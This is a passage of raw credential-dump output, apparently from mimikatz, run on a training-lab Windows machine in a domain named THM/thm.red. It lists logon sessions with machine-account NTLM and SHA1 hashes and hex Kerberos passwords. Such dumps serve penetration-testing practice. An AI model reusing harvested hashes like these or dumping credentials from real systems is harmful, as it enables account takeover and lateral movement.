         * SHA1     : b61cc76a7014cca1f31cc9d7c4d8190a76095e3e
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : f7 1d 0d 25 f8 8d 5c da aa b8 6e aa de 49 67 ed 55 8c aa 07 b8 b9 31 45 71 42 7f 33 88 b1 7f 46 32 2f 09 7a ed 3e 2d 9f 3e ef 08 32 2d af d6 22 fb c6 82 01 9e 0c 23 e0 cf 4d 76 90 a0 33 77 8d 24 da 8f 32 79 8c 4b 6f a7 da f2 bd aa cc df e0 84 f2 6a a7 c7 92 3c 8a 8a b8 6d df 33 44 2e d6 db 7f 24 0e 37 3d 46 7e 42 66 a1 d1 26 a3 0a 6f e2 22 e3 22 c5 7d 8b 5e 5c 68 51 dc 65 a6 67 7c fb fd ea 6e 7b cd 94 3f a6 44 21 36 ab a7 c2 ba 67 dd 56 e9 ec 89 e6 3a c5 39 2c f7 70 4e 5f 59 83 e6 17 4b 1b f2 ad a8 5a 33 09 93 81 ee 4f 5e 60 28 72 8a 5b 4a 97 8c 9d eb 2a 9e a4 7a 89 7c e7 6f ea 1c 20 da ea 85 f8 ea 11 f3 24 ab 1c 7e 75 ee a2 a4 98 7d 61 d2 b2 f3 af 31 ae a9 b3 4e c2 8c a7 37 26 30 f2 0f c1 9d 77 1f 54 82 eb 7e
        ssp :
        credman :

Authentication Id : 0 ; 63677 (00000000:0000f8bd)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/26/2022 4:15:01 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 443e64439d4b7fe780da17fc04a3942a
         * SHA1     : 7a71c63de7dcfce533ce4afff91639743461aa6a
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 7f 35 fb be 30 0b a0 29 84 77 92 45 16 8b ed 11 a3 0d 4e f5 ff cc 8e 61 d0 f3 f4 05 d5 b8 a9 57 f3 2a 25 f9 5f 74 d7 eb 3f 14 cd e9 21 96 d6 c8 59 17 8b 79 ae 4d c2 88 57 09 84 b1 87 2f 2b 18 44 95 d2 80 f6 90 24 57 79 37 dd 79 57 19 9f 91 d8 99 0f 53 5b c2 54 71 48 80 84 b0 75 77 2e 0e 40 a2 cb 87 38 50 37 2e 84 15 d2 74 4e db 29 11 f9 36 9e af 78 7b 53 c7 14 f8 2a 25 c9 18 f0 65 25 d3 22 84 a9 a4 7b 92 93 34 9a 49 e9 fc 76 56 32 35 e3 f2 8a 12 c3 30 e1 26 0a 67 ce 08 28 76 81 74 f4 55 fd 7b e4 0a 5c 8d 70 22 8a 6b 27 ea 7c d8 da 09 0b e5 4e 89 09 5b 21 1b 63 21 ec b2 48 24 95 24 8f 59 0c 05 fd 54 9d 4e c6 99 67 69 b2 de 76 20 c9 a1 06 a2 e6 fb 8c 7b 14 86 9d 4c 0f 10 2b b7 6d df d2 f3 6e cf d4 b2 71 da 06 2d
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CREDS-HARVESTIN$
Domain            : THM
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:59 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
         * SHA1     : b61cc76a7014cca1f31cc9d7c4d8190a76095e3e
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : creds-harvestin$
         * Domain   : THM.RED
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 34485 (00000000:000086b5)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:58 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 443e64439d4b7fe780da17fc04a3942a
         * SHA1     : 7a71c63de7dcfce533ce4afff91639743461aa6a
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 7f 35 fb be 30 0b a0 29 84 77 92 45 16 8b ed 11 a3 0d 4e f5 ff cc 8e 61 d0 f3 f4 05 d5 b8 a9 57 f3 2a 25 f9 5f 74 d7 eb 3f 14 cd e9 21 96 d6 c8 59 17 8b 79 ae 4d c2 88 57 09 84 b1 87 2f 2b 18 44 95 d2 80 f6 90 24 57 79 37 dd 79 57 19 9f 91 d8 99 0f 53 5b c2 54 71 48 80 84 b0 75 77 2e 0e 40 a2 cb 87 38 50 37 2e 84 15 d2 74 4e db 29 11 f9 36 9e af 78 7b 53 c7 14 f8 2a 25 c9 18 f0 65 25 d3 22 84 a9 a4 7b 92 93 34 9a 49 e9 fc 76 56 32 35 e3 f2 8a 12 c3 30 e1 26 0a 67 ce 08 28 76 81 74 f4 55 fd 7b e4 0a 5c 8d 70 22 8a 6b 27 ea 7c d8 da 09 0b e5 4e 89 09 5b 21 1b 63 21 ec b2 48 24 95 24 8f 59 0c 05 fd 54 9d 4e c6 99 67 69 b2 de 76 20 c9 a1 06 a2 e6 fb 8c 7b 14 86 9d 4c 0f 10 2b b7 6d df d2 f3 6e cf d4 b2 71 da 06 2d
        ssp :
        credman :

Authentication Id : 0 ; 34455 (00000000:00008697)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:58 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 443e64439d4b7fe780da17fc04a3942a
         * SHA1     : 7a71c63de7dcfce533ce4afff91639743461aa6a
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 7f 35 fb be 30 0b a0 29 84 77 92 45 16 8b ed 11 a3 0d 4e f5 ff cc 8e 61 d0 f3 f4 05 d5 b8 a9 57 f3 2a 25 f9 5f 74 d7 eb 3f 14 cd e9 21 96 d6 c8 59 17 8b 79 ae 4d c2 88 57 09 84 b1 87 2f 2b 18 44 95 d2 80 f6 90 24 57 79 37 dd 79 57 19 9f 91 d8 99 0f 53 5b c2 54 71 48 80 84 b0 75 77 2e 0e 40 a2 cb 87 38 50 37 2e 84 15 d2 74 4e db 29 11 f9 36 9e af 78 7b 53 c7 14 f8 2a 25 c9 18 f0 65 25 d3 22 84 a9 a4 7b 92 93 34 9a 49 e9 fc 76 56 32 35 e3 f2 8a 12 c3 30 e1 26 0a 67 ce 08 28 76 81 74 f4 55 fd 7b e4 0a 5c 8d 70 22 8a 6b 27 ea 7c d8 da 09 0b e5 4e 89 09 5b 21 1b 63 21 ec b2 48 24 95 24 8f 59 0c 05 fd 54 9d 4e c6 99 67 69 b2 de 76 20 c9 a1 06 a2 e6 fb 8c 7b 14 86 9d 4c 0f 10 2b b7 6d df d2 f3 6e cf d4 b2 71 da 06 2d
        ssp :
        credman :

Authentication Id : 0 ; 34445 (00000000:0000868d)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:14:58 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
